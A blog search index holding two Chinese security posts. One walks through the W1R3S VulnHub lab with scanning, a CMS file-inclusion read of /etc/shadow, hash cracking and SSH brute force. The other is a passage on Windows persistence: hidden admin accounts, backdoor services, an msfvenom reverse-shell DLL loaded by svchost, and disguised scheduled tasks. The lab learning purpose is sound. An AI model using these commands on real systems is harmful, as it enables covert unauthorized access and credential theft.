<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>w1r3s.v1.0.1靶场学习</title>
      <link href="/2024/04/19/w1r3s-v1-0-1%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/19/w1r3s-v1-0-1%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>这是一个vulnhub里的一个初级的渗透靶场，主要是为了熟悉一下各个信息搜集工具的使用，以及跟着红队笔记的视频来学习一下渗透思路打一下基础。</p><p>这里的环境就一台靶机，直接打开vmx即可进行测试。</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="主机存活探测"><a href="#主机存活探测" class="headerlink" title="主机存活探测"></a>主机存活探测</h2><p>渗透第一步需要做的就是信息搜集，我们先要确定主机的存活，确认我们要攻击的主机。</p><p>这里用几种方式来进行探测主机存活</p><p><strong>namp</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">namp -sn 192.168.20.0/24 # -sn 采用四种不同类型的数据包探测目标主机是否在线，只进行主机探测不进行端口扫描<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419192322268.png" alt="image-20240419192322268"></p><p><strong>arp-scan</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">arp-scan -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419192521545.png" alt="image-20240419192521545"></p><p>经过上面两种探测之后可以知道我们的目标靶机就是192.168.20.129，接下来就是对端口进行扫描搜集一下有哪些服务</p><h2 id="端口扫描探测"><a href="#端口扫描探测" class="headerlink" title="端口扫描探测"></a>端口扫描探测</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -sT 192.168.20.129 # -sT 使用TCP进行端口扫描<br><span class="hljs-meta prompt_">#</span><span class="language-bash">还可以用这个命令扫描制定其他要求</span><br>nmap -sT --min-rate 10000 -p- 192.168.20.129 -oA nmap/ports# --min-rate，设置最低发包速率，这里为每秒一万次；-p- 是扫描1-65535端口的简化写法；-oA 将结果的所有格式都导出来，如果端口多的话可以方便我们查看保存下来<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419192855002.png" alt="image-20240419192855002"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419222045487.png" alt="image-20240419222045487"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419222030200.png" alt="image-20240419222030200"></p><p>发现这里开启了ftp、ssh、http、mysql服务</p><p>红队笔记这里还有一个很好的习惯，就是把端口提取出来，如果端口太多的话这样就会会很方便，现在我们从文件中将这四个端口提取出来，然后我们将其赋值给一个变量就可以直接用就会方便很多</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">grep open ports.nmap <br>grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; #就是以斜杠为分隔符，然后打印第一个字段<br>grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27; #将字符合并到一行并以逗号为分隔符<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里 awk 默认会将每一行作为一个记录来处理</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419223441495.png" alt="image-20240419223441495"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419223456921.png" alt="image-20240419223456921"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419223537108.png" alt="image-20240419223537108"></p><p>这样就可以赋值给一个变量，然后-p参数就能直接探测该变量中的端口了</p><p>接下来确认端口之后就对这些端口的具体服务信息进行扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ports=$(grep open ports.nmap| awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)<br>nmap -sT -sV -sC -O -p $ports -oA nmap/details<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-sV 探测服务版本；-sC 使用默认脚本扫描 -O 探测操作系统版本</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419224852873.png" alt="image-20240419224852873"></p><p>这样我们就搜集到了相关的信息就可以开始选择性开始对具体端口进行渗透</p><p>还可以使用fscan直接一条命令扫出来</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./fscan_amd64 -h 192.168.20.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419225047643.png" alt="image-20240419225047643"></p><h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><h2 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h2><p>从上面可以看是一个ftp匿名服务器，我们就可以直接登陆看看有什么东西</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ftp 192.168.20.129 #匿名ftp用户名都是anonymous<br></code></pre></td></tr></table></figure><p>这里列一下ftp常用命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">查看指定后缀文件<br>dir .jpg<br><br>删除单个文件<br>delete 文件名<br><br>删除多个文件<br># 格式：mdelete remote-files [ ...]<br>mdelete 文件名<br><br>重命名文件<br># 格式：rename filename newfilename<br>rename test atest<br><br>上传文件<br># 格式：put local-file [remote-file]<br>put /home/a.txt /mydata/b.txt<br><br>下载单个文件<br># 格式：get [remote-file] [local-file]<br>get /mydata/a.txt /apps/b.txt<br><br>下载多个文件<br># 格式：mget filename [filename ....]<br>mget *.*<br><br>输入?可以查看所有指令<br></code></pre></td></tr></table></figure><p>登陆之后看看都有什么</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419225708258.png" alt="image-20240419225708258"></p><p>我们可以输入binary切换成二进制传输模式，防止有些可执行文件损坏</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419230254565.png" alt="image-20240419230254565"></p><p>然后我们进去这些目录把文件都下载下来，我们可以使用<strong>prompt</strong>命令关掉交互模式，这样下载文件就不需要我们确认更加方便</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419230904141.png" alt="image-20240419230904141"></p><p>然后去查看一下文件内容看有没有什么提示</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419231041052.png" alt="image-20240419231041052"></p><p>给了一串md5和base64的字符串，去解码看一下有什么用</p><p>md5解密出来为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This is not a password<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419231247620.png" alt="image-20240419231247620"></p><p>base64解密出来</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419231341272.png" alt="image-20240419231341272"></p><p>然后就是一些员工名单：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources<br></code></pre></td></tr></table></figure><p>然后就是下面的翻转文字，这里截图旋转一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419231602348.png" alt="image-20240419231602348"></p><p>似乎就是提示从这里入手不太行</p><p>然后还发现了一个有意思的，这些文字logo网上可以找到ascii转logo的网站，这里是一个网站：<a href="https://patorjk.com/software/taag/#p=testall&f=Isometric2&t=helloworld%0A">https://patorjk.com/software/taag/#p=testall&amp;f=Isometric2&amp;t=helloworld%0A</a></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419231939106.png" alt="image-20240419231939106"></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>这里不太行就开始看一些他的http页面吧</p><p>进去之后是一个apache的页面</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419232336159.png" alt="image-20240419232336159"></p><p>找不到什么能用的东西就直接开始端口扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">dirsearch -u &quot;http://192.168.20.129/&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419232812060.png" alt="image-20240419232812060"></p><p>这里还学到一个新的目录扫描工具gobuster，他的扫描命令如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gobuster dir -u &quot;http://192.168.20.129/&quot; --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">其他的字典可以去该目录下查看</span><br></code></pre></td></tr></table></figure><blockquote><p>gobuster的三种模式</p><p>dir：传统的目录爆破模式；<br>dns：DNS子域名爆破模式；<br>vhost：虚拟主机爆破模式；</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419233246596.png" alt="image-20240419233246596"></p><p>现在去相关端口看看有什么东西</p><p>前面两个都访问不了，最后一个有东西，似乎是一个cms的安装界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://192.168.20.129/administrator/installation/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419233413396.png" alt="image-20240419233413396"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419233448024.png" alt="image-20240419233448024"></p><p>这里吓得我不敢继续了，要是覆盖了这咋整正常人谁把这玩意放上来啊（</p><p>然后随便填了东西试了一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419233619820.png" alt="image-20240419233619820"></p><p>root用户是无法创建的</p><p>emmm然后有点无从入手了，因为也不知道是什么cms，这是我把鼠标移到问号上在底下突然有了提示，是Cuppa CMS</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419234002096.png" alt="image-20240419234002096"></p><p>这样就好办了，可以去搜一下这个CMS有没有漏洞，难绷搜了一下都是直接指向这个靶场的wp。。</p><p>那这里就学习红队笔记里的搜索方法，用到了<strong>searchsploit</strong>工具</p><blockquote><p><code>searchsploit</code>是一个用于<code>Exploit-DB</code>的命令行搜索工具，可以帮助我们查找渗透模块。</p><p>Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，利用上面提到的命令就可以查找需要的渗透模块，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。</p></blockquote><p>这里copy一下别人翻译的选项，参考文章：<a href="https://juejin.cn/post/7026899204446355486">https://juejin.cn/post/7026899204446355486</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Usage: searchsploit [options] term1 [term2] ... [termN]<br>​<br>==========<br> Examples<br>==========<br>  searchsploit afd windows local<br>  searchsploit -t oracle windows<br>  searchsploit -p 39446<br>  searchsploit linux kernel 3.2 --exclude=&quot;(PoC)|/dos/&quot;<br>​<br>  For more examples, see the manual: https://www.exploit-db.com/searchsploit/<br>​<br>=========<br> Options<br>=========<br>   -c, --case     [Term]      区分大小写(默认不区分大小写)<br>   -e, --exact    [Term]      对exploit标题进行EXACT匹配 (默认为 AND) [Implies &quot;-t&quot;].<br>   -h, --help                 显示帮助<br>   -j, --json     [Term]      以JSON格式显示结果<br>   -m, --mirror   [EDB-ID]    把一个exp拷贝到当前工作目录,参数后加目标id<br>   -o, --overflow [Term]      Exploit标题被允许溢出其列<br>   -p, --path     [EDB-ID]    显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号<br>   -t, --title    [Term]      仅仅搜索漏洞标题（默认是标题和文件的路径）<br>   -u, --update               检查并安装任何exploitdb软件包更新（deb或git）<br>   -w, --www      [Term]      显示Exploit-DB.com的URL而不是本地路径（在线搜索）<br>   -x, --examine  [EDB-ID]    使用$ PAGER检查（副本）Exp<br>       --colour               搜索结果不高亮显示关键词<br>       --id                   显示EDB-ID<br>       --nmap     [file.xml]  使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）<br>                                使用“-v”（详细）来尝试更多的组合<br>       --exclude=&quot;term&quot;       从结果中删除值。通过使用“|”分隔多个值<br>                              例如--exclude=“term1 | term2 | term3”。<br>​<br>=======<br> Notes<br>=======<br> * 你可以使用任意数量的搜索词。<br> * Search terms are not case-sensitive (by default), and ordering is irrelevant.<br>   * 搜索术语不区分大小写(默认情况下)，而排序则无关紧要。<br>   * 如果你想用精确的匹配来过滤结果，请使用用 -e 参数<br> * 使用&#x27; - t &#x27;将文件的路径排除，以过滤搜索结果<br>   * 删除误报(特别是在搜索使用数字时 - i.e. 版本).<br> * 当更新或显示帮助时，搜索项将被忽略。<br></code></pre></td></tr></table></figure><p>那我们就直接搜索cuppa cms相关的漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">searchsploit cuppa cms<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419235101032.png" alt="image-20240419235101032"></p><p>发现有一条exp我们可以把他下载下来看一下利用方式</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">searchsploit cuppa cms -m 25971<br>cat 25971.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419235525664.png" alt="image-20240419235525664"></p><p>我们看到了关键的利用路径和方式，是一个本地&#x2F;远程文件包含漏洞，外加一个目录穿越，那现在我们就去测试一下</p><p>但是直接使用cuppa的路径是无效的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419235900623.png" alt="image-20240419235900623"></p><p>联想到我们刚刚的安装页面是administrator&#x2F;installation，猜测cuppa被替换成administrator</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420000029674.png" alt="image-20240420000029674"></p><p>发现能够访问，但是没有东西读回来，我们burp抓包看一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420000345099.png" alt="image-20240420000345099"></p><p>发现还是没什么东西，换个请求方式看看</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420000423856.png" alt="image-20240420000423856"></p><p>发现能读了，我们去读一下&#x2F;etc&#x2F;shadow</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420000532005.png" alt="image-20240420000532005"></p><p>发现密码都出来了，我们可以用john去爆破一下，把shadow的内容都copy下来保存成文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420000813947.png" alt="image-20240420000813947"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">john pass.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420000853870.png" alt="image-20240420000853870"></p><p>看到两个用户的密码被爆出来了，www-data一般是低权限的用户，我们就去试一下w1r3s这个用户，前面扫出来22的ssh服务，那我们就可以用ssh去连接看看</p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>拿到账户密码之后去ssh连接</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh w1r3s@192.168.20.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420001327741.png" alt="image-20240420001327741"></p><p>成功登陆！</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id #打印真实以及有效的用户和所在组的信息<br>sudo -l #查看有哪些系统权限，列出目前用户可执行与无法执行的指令<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420001652163.png" alt="image-20240420001652163"></p><p>发现拥有所有sudo权限，那我们就可以直接切换root用户了！</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420001824485.png" alt="image-20240420001824485"></p><p>最后查看root目录下的flag.txt</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420001906178.png" alt="image-20240420001906178"></p><p>成功拿下这台主机！</p><p><strong>hydra</strong></p><p>这里还可以用hydra来爆破ssh，来学习一下</p><blockquote><p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。</p><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/397779150">https://zhuanlan.zhihu.com/p/397779150</a></p></blockquote><p>这里贴一下基本使用语法和参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">语法：Hydra 参数 IP 服务<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">参数：<br>-l login 小写，指定用户名进行破解<br>-L file 大写，指定用户的用户名字典<br>-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。<br>-P file 大写，用于指定密码字典。<br>-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探<br>-M file 指定目标ip列表文件，批量破解。<br>-o file 指定结果输出文件<br>-f 找到第一对登录名或者密码的时候中止破解。<br>-t tasks 同时运行的线程数，默认是16<br>-w time 设置最大超时时间，单位<br>-v / -V 显示详细过程<br>-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）<br>-x 自定义密码。<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">service：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。<br>注意：<br>1.自己创建字典,然后放在当前的目录下或者指定目录。<br>2.参数可以统一放在最后，格式比如hydra ip 服务 参数。<br>3.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。<br>4.缺点，如果目标网站登录时候需要验证码就无法破解。<br>5.man hydra最万能。<br>6.或者hydra -U http-form等查看具体帮助。<br></code></pre></td></tr></table></figure><p>可以先构造一个用户字典用于爆破：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">vim user.list<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420002455502.png" alt="image-20240420002455502"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">hydra -L user.list -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.20.129<br></code></pre></td></tr></table></figure><p>难绷没跑出来，这我也不知道为什么了，这字典明明很大</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420010700256.png" alt="image-20240420010700256"></p><p>搜了一下发现也是有computer密码的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420010802330.png" alt="image-20240420010802330"></p><p>然后我把w1r3s放到第一个，跑了好一会终于有了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420012002198.png" alt="image-20240420012002198"></p><h2 id="mysql服务"><a href="#mysql服务" class="headerlink" title="mysql服务"></a>mysql服务</h2><p>这里可能会存在没有设置密码直接登陆的情况，可以试一下，不过基本都是不可能的，所以一开始就没想着先试它</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mysql 192.168.20.129 -u root -p <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240420002113439.png" alt="image-20240420002113439"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网权限持久化</title>
      <link href="/2024/04/16/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2024/04/16/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>权限持久化(Persistence，权限维持)技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访间中断的情况发生时保持对系统的访问的技术，如创建系统服务、利用计划任务、滥用系统启动项或注册表、映像劫持、替换或劫持合法代码等。</p><h1 id="常见系统后门技术"><a href="#常见系统后门技术" class="headerlink" title="常见系统后门技术"></a>常见系统后门技术</h1><h2 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h2><p>就是创建隐藏的用户，无论通过计算机管理还是命令行查询都无法看到，只能在注册表中查到其信息。</p><p>下面是创建影子账户的步骤：</p><ol><li><p>输入下面命令创建一个Hacker$用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user Hacker$ Hacker@123 /add # 创建隐藏用户，$符号代表该用户为隐藏用户<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416212700791.png" alt="image-20240416212700791"></p><p>不过现在还是可以看到该用户</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416213021125.png" alt="image-20240416213021125"></p><p>此时该用户仍为标准用户，我们还需要进行注册表的修改</p></li><li><p>在注册表编辑器中定位到HKEY_LOCAL_MACHINE\SAM\SAM,单击右键，在弹出的快捷菜单中选择“权限”命令，将 Administrator用户的权限设置为“完全控制”</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416213258642.png" alt="image-20240416213258642"></p></li><li><p>在注册表项 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names处选择 Administrator 用户,在左侧找到与右边显示的键值的类型“0x1f4”相同的目录名</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416213805850.png" alt="image-20240416213805850"></p><p>然后复制000001F4表项的F属性的值</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416214222391.png" alt="image-20240416214222391"></p></li><li><p>找到隐藏用户的相应目录，然后将复制的属性值粘贴到隐藏用户的F属性处。</p><p>以上过程其实是 Hacker$用户劫持了Administrator用户的RID，从而使 Hacker$用户获得 Administrator 用户的权限</p><blockquote><p>这里很怪，在Winserver2012上面创建了账户在注册表没有，只有两个账户，就上图的两个，但是Windows7就全都有</p></blockquote></li><li><p>分别将注册表项“Hacker$”和其对应的目录导出，然后执行下面命令先删除一次用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net user Hacker$ /del<br></code></pre></td></tr></table></figure></li><li><p>再将刚刚导出的两个注册表项导入注册表即可创建真正的影子用户。</p></li></ol><h2 id="系统服务后门"><a href="#系统服务后门" class="headerlink" title="系统服务后门"></a>系统服务后门</h2><p>对于启动类型为“自动”的系统服务，测试人员可以将服务运行的二进制文件路径设置为后门程序或其他攻击载荷，当系统或服务重启时，可以重新获取对目标主机的控制权。不过，测试人员需要拥有目标主机的管理员权限。</p><p><strong>创建系统服务</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc create Backdoor binpath= &quot;cmd.exe /k C:\Windows\System32\reverse_tcp.exe&quot; start=&quot;auto&quot; obj=&quot;LocalSystem&quot;<br></code></pre></td></tr></table></figure><p>在目标主机上创建一个名为Backdoor 的系统服务，启动类型为“自动”，启动权限为SYSTEM。</p><p><strong>利用现有的系统服务</strong></p><p>通过修改现有服务的配置信息，使服务启动时运行指定的后门程序。测试人员可以通过“sc config”命令修改服务的 binpath选项，也可以尝试修改服务注册表的ImagePath键，二者都直接指定了相应服务的启动时运行的二进制文件</p><p><strong>利用svchost.exe启动服务</strong></p><p>svchost.exe是一个系统进程，是Windows的系统文件。</p><p>官方解释：svchost.exe是从动态链接库(DLL)中运行的服务的通用主机进程名称。该程序本身只是作为服务的宿主，许多系统服务通过注入该程序进程中启动，所以系统中会存在多个该程序的进程。</p><p>在 Windows系统中，需要由svchost.exe进程启动的服务将以 DLL 形式实现。在安装这些服务时，需要将服务的可执行文件路径指向svchost.exe。在启动这些服务时，由svchost.exe 调用相应服务的 DLL 文件，而具体调用哪个 DLL 是由该服务在注册表的信息所决定的。</p><p>以wuauserv服务为例(Windows Update)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416223420143.png" alt="image-20240416223420143"></p><p>可以看到该服务的可执行文件路径：<code>%systemroot%\system32\svchost.exe -k netsvcs</code>，说明该服务依靠svchost.exe来加载DLL。</p><p>该服务的注册表下还有一个Parameters子项，其中的ServiceDll键值表明该文件由哪个DLL文件负责。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416224101357.png" alt="image-20240416224101357"></p><p>服务启动时，svchost.exe就会加载该DLL文件。</p><p>注意，系统会根据服务可执行文件路径中的参数对服务进行分组，如C:\Windowssystem32\svchost.exe -k netsvcs 表明该服务属于netsvcs这个服务组。通常，每个 svchost进程负责运行一组服务。因此，并不是每启动一个服务就会增加一个svchost.exe进程。</p><p>所有服务分组可以在注册表的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost中。通过svchost.exe加载启动的服务都要在该表项中注册。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416224711806.png" alt="image-20240416224711806"></p><p>利用过程：</p><ol><li><p>用Metasploit生成DLL</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f dll -o reverse_tcp.dll<br></code></pre></td></tr></table></figure></li><li><p>将生成的DLL上传到目标主机的System32目录，并执行下面命令安装并配置恶意服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">创建名为 Backdoor的服务，并以svchost加载的方式启动，服务分组为 netsvc</span><br>sc create Backdoor binPath= &quot;C:\Windows\System32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem<br><span class="hljs-meta prompt_">#</span><span class="language-bash">将Backdoor服务启动时加载的DLL为reverse_tcp.dll</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\reverse_tcp.dll&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置服务描述</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v Description /t REG_SZ /d &quot;Windows xxx Service&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">配置服务显示名称</span><br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor /v DisplayName /t REG_SZ /d &quot;Backdoor&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建服务新分组，并将Backdoor服务添加进去</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d Backdoor<br></code></pre></td></tr></table></figure></li></ol><p>配置好后，Svchost就会以SYSTEM权限加载恶意DLL，即可上线主机。</p><h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><p>通过创建计划任务，让服务器定时运行后门程序，实现权限持久化。</p><p>比如在目标主机上创建一个名为Backdoor的计划任务，并在每天八点以SYSTEM权限运行一次后门程序reverse_tcp.exe</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /TN Backdoor /SC daily /ST 8:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F<br></code></pre></td></tr></table></figure><p>计划任务触发后主机就会重新上线</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416231100712.png" alt="image-20240416231100712"></p><p>上图可以看到计划任务以类似文件目录的方式存储，所有计划任务都存储在最内层的目录；所以为了增加隐蔽性，可以依照这个规则来创建计划任务。</p><p>比如这样：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /TN \Microsoft\Windows\AppTask\AppRun /SC daily /ST 8:00 /MO 1 /TR C:\Windows\System32\reverse_tcp.exe /RU System /F<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416232004716.png" alt="image-20240416232004716"></p><h2 id="启动项-注册表后门"><a href="#启动项-注册表后门" class="headerlink" title="启动项&#x2F;注册表后门"></a>启动项&#x2F;注册表后门</h2><p>测试人员可以通过将后门程序添加到系统启动文件夹或通过注册表运行键引用来进行权限持久化。添加的后门程序将在用户登录的上下文中启动，并且将具有与账户相关联的权限等级。</p><p><strong>系统启动文件夹</strong></p><p>将程序放在启动文件夹中会导致该程序在用户登录时执行。Windows有两种常见的启动文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 位于以下目录的程序将在指定用户登录时启动<br>C:Users\[Username]\AppData\Roaming\Microsoft\Windows\Start<br>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br># 位于以下目录的程序将在所有用户登录时启动<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br></code></pre></td></tr></table></figure><p><strong>运行键(Run Keys)</strong></p><p>Windows 系统上有许多注册表项可以用来设置在系统启动或用户登录时运行指定的程序或加载指定 DLL 